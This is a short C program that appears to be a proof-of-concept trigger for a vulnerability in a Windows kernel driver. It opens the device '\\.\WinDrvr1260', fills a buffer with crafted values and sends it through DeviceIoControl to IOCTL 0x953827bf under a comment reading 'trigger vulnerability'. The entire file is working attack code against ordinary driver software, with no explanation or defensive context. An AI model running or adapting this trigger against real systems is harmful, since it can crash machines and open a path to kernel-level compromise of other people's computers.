#include "windows.h"
#include "winioctl.h"
#include "stdio.h"


int main()
{
	DWORD dwOut, n;
	char bufOutput[0x2000];
	char bufInput[0x20];


	HANDLE hDriver = CreateFile(
		"\\\\.\\WinDrvr1260",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("Open device failed:%x\n", GetLastError());
		return -1;
	}

	DWORD dwRet = 0;
	DWORD nRet;
	n = 0;


	memset(bufOutput, 0x0, 0x2000);
	memset(bufInput, 0x0, 0x20);
	//
	//// trigger vulnerability
	//
	((DWORD *)bufOutput)[0] = 0x1;
	((DWORD *)bufOutput)[2] = 0x1;
	((DWORD *)bufOutput)[3] = 0x1;
	((DWORD *)bufOutput)[4] = 0x1;
	((DWORD *)bufOutput)[5] = 0x1;
	((DWORD *)bufOutput)[6] = 0x0;
	((DWORD *)bufOutput)[14] = 0x140;
	nRet = DeviceIoControl(hDriver, 0x953827bf, &bufOutput, 0x100, &bufInput, 0x20, &dwRet, NULL);

}